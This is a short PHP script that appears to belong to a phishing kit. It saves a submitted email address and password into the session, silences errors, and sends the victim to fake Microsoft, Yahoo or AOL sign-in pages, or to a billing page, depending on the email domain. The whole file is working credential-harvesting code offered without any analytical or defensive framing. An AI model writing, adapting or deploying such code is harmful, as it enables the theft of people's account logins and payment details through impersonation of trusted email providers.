<?php 
session_start();
error_reporting(0);
if (isset($_POST['Sex'])) {
$_SESSION['EM'] = $_POST['EM'];
$_SESSION['PW'] = $_POST['PW'];
}
function strafter($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, $pos+strlen($substring)));
}

function strbefore($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, 0, $pos));
} 

$emelbule2 = $_SESSION['EM'];
$emelbule1 = strafter($emelbule2,'@');
$emelbule = strbefore($emelbule1,'.');

if ($emelbule == "hotmail" || $emelbule == "outlook" || $emelbule == "msn" || $emelbule == "live") {
    header('Location: ../email/microsoft/emailauth.php?udm_cat_path=' . sha1(time()));
}else if($emelbule == "yahoo" || $emelbule == "ymail" || $emelbule == "bellsouth" || $emelbule == "sbcglobal"){
    header('Location: ../email/yahoo/emailauth.php?udm_cat_path=' . sha1(time()));
}else if($emelbule == "aol"){
    header('Location: ../email/aol/emailauth.php?udm_cat_path=' . sha1(time()));
}else(header('Location: Acc_Billing.php?udm_cat_path=' . sha1(time())));

?>


